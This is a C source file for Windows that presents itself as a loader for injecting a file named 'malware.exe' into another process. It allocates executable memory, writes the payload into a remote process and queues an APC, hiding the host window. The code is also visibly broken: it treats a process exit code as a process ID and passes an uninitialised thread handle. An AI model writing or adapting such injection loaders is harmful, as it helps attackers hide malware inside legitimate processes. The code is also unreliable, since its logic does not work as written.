#include <windows.h>
#include <stdio.h>

int main(int argc, char** argv) {

    if (argc != 2) {
        printf("Usage: %s <process name>\n", argv[0]);
        return 1;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    PROCESS_INFORMATION new_pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcess(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Failed to create process. Error code: %d\n", GetLastError());
        return 1;
    }

    LPVOID image = NULL;
    HANDLE file = CreateFile("path\\to\\your\\malware.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (file != INVALID_HANDLE_VALUE) {

        DWORD size = GetFileSize(file, NULL);
        image = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (image != NULL) {

            DWORD read = 0;
            if (ReadFile(file, image, size, &read, NULL)) {

                if (pi.hThread != NULL) {

                    if (ResumeThread(pi.hThread) != (DWORD)-1) {

                        WaitForSingleObject(pi.hProcess, INFINITE);

                        if (GetExitCodeProcess(pi.hProcess, &new_pi.dwProcessId)) {

                            new_pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, new_pi.dwProcessId);

                            if (new_pi.hProcess != NULL) {

                                LPVOID remoteImage = VirtualAllocEx(new_pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                WriteProcessMemory(new_pi.hProcess, remoteImage, image, size, NULL);
                                QueueUserAPC((PAPCFUNC)remoteImage, new_pi.hThread, (ULONG_PTR)remoteImage);
                                CloseHandle(new_pi.hProcess);

                            }

                        }

                    }

                }

            }

        }

        CloseHandle(file);

    }

    VirtualFree(image, 0, MEM_RELEASE);

    return 0;
}
